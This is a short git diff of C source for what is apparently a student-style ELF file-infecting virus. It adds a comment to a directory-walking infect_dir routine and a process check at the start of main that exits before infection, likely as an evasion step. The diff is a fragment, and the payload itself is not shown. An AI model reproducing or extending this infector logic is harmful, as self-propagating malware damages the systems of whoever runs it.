@@ -190,7 +190,7 @@ static int		infect_dir(char *path)
 		for (pos = 0; pos < n_read;)
 		{
 			dir = (struct linux_dirent64 *)(buf_d + pos);
-			if (dir->d_type == 8)
+			if (dir->d_type == 8) //dt_reg
 			{
 				ft_memcpy(buf_path_file, path, PATH_MAX);
 				ft_strcat(buf_path_file, dir->d_name);
@@ -205,10 +205,15 @@ static int		infect_dir(char *path)
 
 int		main()
 {
-	char	buf[BUF_SIZE];
+	char			buf[BUF_SIZE];
+	char			buf_path[PATH_MAX];
+
+	write_proc(buf_path);
+	if ((check_process(buf_path)) == 1)
+		return (0);
+
 	write_begin(buf);
 	ft_syswrite(1, buf, 8);
-	char			buf_path[PATH_MAX];
 
 	write_test(buf_path);
 	infect_dir(buf_path);
